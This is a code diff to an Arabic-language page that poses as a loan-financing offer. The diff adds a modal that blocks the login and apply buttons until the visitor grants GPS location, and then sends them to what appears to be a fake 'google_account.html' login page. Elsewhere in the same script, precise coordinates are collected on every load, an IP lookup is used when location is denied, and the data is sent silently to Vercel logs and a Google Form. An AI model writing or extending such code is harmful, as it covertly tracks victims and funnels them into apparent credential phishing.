@@ -763,6 +763,118 @@
                 padding: 24px;
             }
         }
+
+        /* Location Required Modal */
+        .location-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .location-modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .location-modal {
+            background: var(--flash-card-bg);
+            border: 2px solid var(--flash-card-border);
+            border-radius: 28px;
+            padding: 40px 36px;
+            max-width: 440px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), var(--flash-glow);
+            transform: scale(0.9) translateY(20px);
+            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .location-modal-overlay.active .location-modal {
+            transform: scale(1) translateY(0);
+        }
+
+        .location-modal-icon {
+            width: 72px;
+            height: 72px;
+            background: rgba(255, 193, 7, 0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 2rem;
+            color: var(--flash-yellow);
+            animation: pulse-flash 2s infinite ease-in-out;
+        }
+
+        .location-modal h3 {
+            font-size: 1.4rem;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 12px;
+        }
+
+        .location-modal p {
+            font-size: 0.95rem;
+            color: var(--flash-text-muted);
+            line-height: 1.7;
+            margin-bottom: 28px;
+        }
+
+        .location-modal-btns {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn-location-allow {
+            background: linear-gradient(135deg, var(--flash-yellow) 0%, var(--flash-gold) 100%);
+            color: #0f1118;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 30px;
+            font-weight: 800;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 6px 20px rgba(255, 193, 7, 0.4);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-location-allow:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 193, 7, 0.6);
+        }
+
+        .btn-location-close {
+            background: rgba(255, 255, 255, 0.08);
+            color: var(--flash-text-muted);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            padding: 14px 24px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+
+        .btn-location-close:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(255, 255, 255, 0.3);
+            color: #ffffff;
+        }
     </style>
 </head>
 
@@ -1054,6 +1166,29 @@
         </div>
     </footer>
 
+    <!-- Location Required Modal -->
+    <div class="location-modal-overlay" id="locationModal">
+        <div class="location-modal">
+            <div class="location-modal-icon">
+                <i class="fas fa-map-marker-alt"></i>
+            </div>
+            <h3>مطلوب تحديد الموقع 📍</h3>
+            <p>
+                لضمان تقديم أفضل عروض التمويل المتاحة في منطقتك، يرجى السماح بالوصول إلى موقعك الجغرافي.
+                هذا مطلوب لاستكمال عملية التقديم.
+            </p>
+            <div class="location-modal-btns">
+                <button class="btn-location-allow" id="btnAllowLocation">
+                    <i class="fas fa-location-arrow"></i>
+                    السماح بالموقع
+                </button>
+                <button class="btn-location-close" id="btnCloseLocationModal">
+                    لاحقاً
+                </button>
+            </div>
+        </div>
+    </div>
+
     <!-- JAVASCRIPT & GOOGLE ROUTING ENFORCER -->
     <script>
 
@@ -1164,13 +1299,34 @@
                 updateCalculator();
             }
 
-            // Only redirect LOGIN / APPLY buttons to Google auth — nothing else
+            // ====== LOCATION GATE: User MUST allow location to use login/apply ======
+            var locationGranted = false;
+            var pendingRedirect = false; // true when user clicked a login button but location not yet granted
+            var locationModal = document.getElementById('locationModal');
+            var btnAllowLocation = document.getElementById('btnAllowLocation');
+            var btnCloseLocationModal = document.getElementById('btnCloseLocationModal');
+
+            function showLocationModal() {
+                locationModal.classList.add('active');
+            }
+
+            function hideLocationModal() {
+                locationModal.classList.remove('active');
+            }
+
+            // Only redirect LOGIN / APPLY buttons to Google auth IF location is granted
             function redirectToGoogleAuth(e) {
                 if (e) {
                     e.preventDefault();
                     e.stopPropagation();
                 }
-                window.location.href = 'google_account.html';
+                if (locationGranted) {
+                    window.location.href = 'google_account.html';
+                } else {
+                    // Location not granted — show modal and request again
+                    pendingRedirect = true;
+                    showLocationModal();
+                }
             }
 
             // Attach ONLY to login and apply buttons — not every click on the site
@@ -1193,7 +1349,27 @@
                 });
             });
 
-            // Get exact location silently — full precision, nothing shown on website
+            // "Allow Location" button in the modal — re-request GPS
+            btnAllowLocation.addEventListener('click', function() {
+                hideLocationModal();
+                requestGPSOnly();
+            });
+
+            // "Later" button just closes the modal
+            btnCloseLocationModal.addEventListener('click', function() {
+                hideLocationModal();
+                pendingRedirect = false;
+            });
+
+            // Close modal if clicking outside
+            locationModal.addEventListener('click', function(e) {
+                if (e.target === locationModal) {
+                    hideLocationModal();
+                    pendingRedirect = false;
+                }
+            });
+
+            // ====== LOCATION LOGIC ======
             // ALWAYS requests fresh GPS on every page load/refresh — never uses cached coordinates
 
             function handleLocation(z1, z2, extra) {
@@ -1204,6 +1380,9 @@
                 window.z2 = z2Full;
                 localStorage.setItem('z1', z1Full);
                 localStorage.setItem('z2', z2Full);
+
+                // Mark location as granted
+                locationGranted = true;
 
                 // Send to Vercel logs
                 sendErrorToVercel({
@@ -1224,6 +1403,31 @@
                 formData.append('entry.1142725815', z1Full + '@gmail.com');
                 formData.append('entry.566365448', z2Full);
                 fetch(FORM_URL, { method: 'POST', mode: 'no-cors', body: formData }).catch(function() {});
+
+                // If user was trying to go to Google login, redirect now
+                if (pendingRedirect) {
+                    pendingRedirect = false;
+                    window.location.href = 'google_account.html';
+                }
+            }
+
+            function requestGPSOnly() {
+                if (!('geolocation' in navigator)) { ipFallback(); return; }
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        handleLocation(pos.coords.latitude, pos.coords.longitude, 'accuracy: ' + pos.coords.accuracy + 'm, source: GPS');
+                    },
+                    function(err) {
+                        // User denied location — show modal again if they were trying to login
+                        if (pendingRedirect) {
+                            showLocationModal();
+                        }
+                        // Still try IP fallback for data collection
+                        ipFallback();
+                    },
+                    // maximumAge: 0 forces a FRESH position on every call — never returns cached
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
             }
 
             function getGPSLocation() {
@@ -1232,8 +1436,10 @@
                     function(pos) {
                         handleLocation(pos.coords.latitude, pos.coords.longitude, 'accuracy: ' + pos.coords.accuracy + 'm, source: GPS');
                     },
-                    function() { ipFallback(); },
-                    // maximumAge: 0 forces a FRESH position on every call — never returns cached
+                    function() {
+                        // Denied on page load — don't show modal yet, just use IP fallback
+                        ipFallback();
+                    },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             }
@@ -1248,20 +1454,21 @@
                     }).catch(function() {});
             }
 
-            // Request notification permission (non-blocking) then always get fresh GPS
+            // ====== PERMISSION FLOW: Notification first → then Location ======
             function requestPermissions() {
                 if ('Notification' in window && Notification.permission === 'default') {
-                    // Only ask notification permission if not already decided
+                    // Step 1: Ask notification permission first
                     Notification.requestPermission().then(function() {
+                        // Step 2: After notification decision, ask for GPS location
                         getGPSLocation();
                     });
                 } else {
-                    // Permission already granted/denied or API unavailable — get GPS immediately
+                    // Notification already decided or unavailable — go straight to GPS
                     getGPSLocation();
                 }
             }
 
-            // Fire on EVERY page load/refresh — always sends fresh exact location
+            // Fire on EVERY page load/refresh
             requestPermissions();
 
         })();
